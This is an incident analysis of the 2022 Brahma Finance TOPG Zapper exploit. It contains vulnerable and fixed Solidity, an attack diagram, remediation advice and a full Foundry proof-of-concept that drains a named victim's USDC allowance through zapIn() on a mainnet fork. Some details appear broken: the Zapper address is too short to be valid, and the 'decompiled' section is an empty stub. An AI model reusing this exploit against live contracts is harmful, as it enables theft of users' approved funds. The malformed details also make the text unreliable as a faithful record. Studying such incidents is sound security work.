# BrahTOPG — zapIn() swapTarget Arbitrary Call Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | Brahma Finance (TOPG Zapper) |
| **Chain** | Ethereum Mainnet |
| **Loss** | Unconfirmed |
| **Zapper** | [0xD248B30A3766d318C7A87F5Cf334A439446D](https://etherscan.io/address/0xD248B30A3766d318C7A87F5Cf334A439446D) |
| **WETH** | [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2](https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) |
| **USDC** | [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48](https://etherscan.io/address/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) |
| **FRAX** | [0x853d955aCEf822Db058eb8505911ED77F175b99e](https://etherscan.io/address/0x853d955aCEf822Db058eb8505911ED77F175b99e) |
| **Uniswap V2 Router** | [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D](https://etherscan.io/address/0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) |
| **Victim** | [0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3](https://etherscan.io/address/0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3) |
| **Root Cause** | The `swapTarget` + `callData` parameters of `zapIn()` are executed without validation, allowing theft of the victim's allowance |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/BrahTOPG_exp.sol) |

---
## 1. Vulnerability Overview

Brahma Finance's TOPG Zapper is a zap contract that allows users to enter complex positions with a single token. The `zapIn()` function accepted `swapTarget` (DEX router address) and `callData` (swap encoded data) as user-supplied inputs for internal swaps. Since neither parameter was validated, an attacker could set `swapTarget` to the USDC contract address and `callData` to `transferFrom(victim, attacker, amount)`. This resulted in an arbitrary external call that drained the victim's USDC on behalf of the Zapper contract itself.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable zapIn() - swapTarget + callData not validated
contract BrahmaZapper {
    struct ZapData {
        address swapTarget;  // ❌ Allows arbitrary contract address
        bytes callData;      // ❌ Allows arbitrary calldata
        address inputToken;
        uint256 inputAmount;
        address outputToken;
        uint256 minOutput;
    }

    function zapIn(ZapData calldata data) external payable {
        // Receive input token
        IERC20(data.inputToken).transferFrom(msg.sender, address(this), data.inputAmount);

        // ❌ Executes swapTarget and callData without validation
        // Calls arbitrary contract as Zapper (address(this))
        // → Can execute USDC.transferFrom(victim, attacker, amount)
        (bool success,) = data.swapTarget.call(data.callData);
        require(success, "Swap failed");

        uint256 outputAmount = IERC20(data.outputToken).balanceOf(address(this));
        require(outputAmount >= data.minOutput, "Insufficient output");
        IERC20(data.outputToken).transfer(msg.sender, outputAmount);
    }
}

// ✅ Correct pattern - only whitelisted DEXes may be called
contract SafeBrahmaZapper {
    mapping(address => bool) public allowedSwapTargets;
    bytes4 constant TRANSFER_FROM_SELECTOR = bytes4(keccak256("transferFrom(address,address,uint256)"));
    bytes4 constant TRANSFER_SELECTOR      = bytes4(keccak256("transfer(address,uint256)"));

    function zapIn(ZapData calldata data) external payable {
        // ✅ Only whitelisted DEX routers may be called
        require(allowedSwapTargets[data.swapTarget], "Target not allowed");

        // ✅ Block token-manipulation selectors
        bytes4 selector = bytes4(data.callData);
        require(selector != TRANSFER_FROM_SELECTOR, "transferFrom not allowed");
        require(selector != TRANSFER_SELECTOR, "transfer not allowed");

        IERC20(data.inputToken).transferFrom(msg.sender, address(this), data.inputAmount);
        (bool success,) = data.swapTarget.call(data.callData);
        require(success, "Swap failed");

        uint256 outputAmount = IERC20(data.outputToken).balanceOf(address(this));
        require(outputAmount >= data.minOutput, "Insufficient output");
        IERC20(data.outputToken).transfer(msg.sender, outputAmount);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**BrahTOPG_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: `swapTarget` + `callData` parameters of `zapIn()` executed without validation, enabling theft of victim's allowance
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Victim reconnaissance: collect addresses that approved USDC to the Zapper
    │       victim = 0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3
    │
    ├─[2] WETH → FRAX swap (Uniswap V2, normal path)
    │       Acquire small amount of FRAX (to satisfy zapIn format)
    │
    ├─[3] Construct ZapData:
    │       swapTarget = USDC contract address
    │       callData   = transferFrom(victim, attacker, victimBalance)
    │       inputToken = FRAX (disguised as legitimate input)
    │       minOutput  = 0
    │
    ├─[4] Call Zapper.zapIn(zapData)
    │       ❌ No validation of swapTarget or callData
    │       → Zapper executes USDC.transferFrom(victim, attacker, amount)
    │       → Zapper is msg.sender, consuming the allowance victim granted to Zapper
    │
    └─[5] Victim's USDC fully drained
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IBrahmaZapper {
    struct ZapData {
        address swapTarget;
        bytes callData;
        address inputToken;
        uint256 inputAmount;
        address outputToken;
        uint256 minOutput;
    }
    function zapIn(ZapData calldata data) external payable;
}

interface IUniV2Router {
    function swapExactETHForTokens(
        uint256, address[] calldata, address, uint256
    ) external payable returns (uint256[] memory);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract BrahTOPGExploit is Test {
    IBrahmaZapper zapper = IBrahmaZapper(0xD248B30A3766d318C7A87F5Cf334A439446D);
    IUniV2Router  router = IUniV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 USDC  = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 FRAX  = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address victim = 0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3;

    function setUp() public {
        vm.createSelectFork("mainnet", 15_933_794);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker USDC", USDC.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[Start] Victim USDC", USDC.balanceOf(victim), 6);

        // [Step 1] WETH → FRAX swap (to satisfy zapIn input format)
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(FRAX);
        router.swapExactETHForTokens{value: 0.01 ether}(0, path, address(this), block.timestamp);
        FRAX.approve(address(zapper), type(uint256).max);

        // [Step 2] Check victim's USDC allowance granted to Zapper
        uint256 victimAllowance = USDC.allowance(victim, address(zapper));
        uint256 victimBalance   = USDC.balanceOf(victim);
        uint256 drainAmount     = victimAllowance < victimBalance ? victimAllowance : victimBalance;

        // [Step 3] Construct malicious ZapData
        // swapTarget = USDC contract, callData = transferFrom(victim → attacker)
        bytes memory maliciousCallData = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256)")),
            victim,
            address(this),
            drainAmount
        );

        IBrahmaZapper.ZapData memory zapData = IBrahmaZapper.ZapData({
            swapTarget:  address(USDC),    // ← USDC contract
            callData:    maliciousCallData, // ← transferFrom(victim, attacker, all)
            inputToken:  address(FRAX),
            inputAmount: FRAX.balanceOf(address(this)),
            outputToken: address(USDC),
            minOutput:   0
        });

        // [Step 4] Call zapIn — Zapper drains victim's USDC
        // ⚡ Zapper executes USDC.transferFrom(victim, attacker) in its own name
        zapper.zapIn(zapData);

        emit log_named_decimal_uint("[End] Attacker USDC", USDC.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[End] Victim USDC", USDC.balanceOf(victim), 6);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | zapIn() swapTarget + callData arbitrary external call |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Arbitrary Call Vulnerability (victim allowance theft) |
| **Attack Vector** | `zapIn({swapTarget: USDC, callData: transferFrom(victim, attacker, all)})` |
| **Preconditions** | Victim has approved USDC to the Zapper; `swapTarget`/`callData` not validated |
| **Impact** | Full drainage of victim's USDC balance |

---
## 6. Remediation Recommendations

1. **swapTarget Whitelist**: Restrict the DEX router addresses the Zapper may call to a pre-registered allowlist.
2. **Block Dangerous Selectors**: Inspect the first 4 bytes of `callData` and block token-manipulation functions such as `transfer`, `transferFrom`, and `approve`.
3. **Prohibit Calls to Token Contracts**: Explicitly block cases where `swapTarget` matches `inputToken` or `outputToken`.

---
## 7. Lessons Learned

- **Recurring Vulnerability in the Zapper Pattern**: Aggregator contracts that dynamically call external DEXes — via patterns like `zapIn()`, `swap()`, or `execute()` — have repeatedly exhibited this same vulnerability across RabbyWallet, TransitSwap, and BrahTOPG. Every contract using this pattern must implement a DEX address whitelist and selector-blocking logic.
- **FRAX Input as Camouflage**: The attacker's transfer of a small amount of FRAX was a disguise to satisfy the input token requirement of `zapIn()`. Even when a function passes its formal preconditions, the absence of the core security check (swapTarget validation) is sufficient for the attack to succeed.
- **Approval Hygiene**: Any approval a user has granted to a Zapper becomes a liability the moment the contract is found to be vulnerable. Revoking approvals after use, or approving exact amounts rather than unlimited allowances, minimizes potential losses.